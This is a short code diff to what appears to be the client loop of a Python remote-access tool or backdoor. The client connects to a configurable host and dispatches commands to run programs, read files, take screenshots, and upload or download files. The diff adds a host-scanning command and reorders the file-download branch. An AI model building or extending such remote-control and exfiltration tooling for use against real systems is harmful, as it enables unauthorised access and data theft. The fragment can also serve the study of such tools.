@@ -5,10 +5,8 @@
 import socket
 import sys
 import time
-import struct
 
 from core import *
-from core import filesock
 
 # change host you need
 HOST = 'localhost'
@@ -44,6 +42,9 @@ def client_loop(conn, dhkey):
         elif cmd == 'cat':
             results = toolkit.cat(action)
 
+        elif cmd == 'download':
+            results = toolkit.sendfile(conn, dhkey)
+
         elif cmd == 'execute':
             results = toolkit.execute(action)
 
@@ -53,12 +54,11 @@ def client_loop(conn, dhkey):
         elif cmd == 'pwd':
             results = toolkit.pwd()
 
+        elif cmd == 'scan':
+            results = scan.single_host(action)
+
         elif cmd == 'screenshot':
             results = toolkit.screenshot()
-
-        # send file
-        elif cmd == 'download':
-            results = toolkit.sendfile(conn, dhkey)
 
         # receive file
         elif cmd == 'upload':
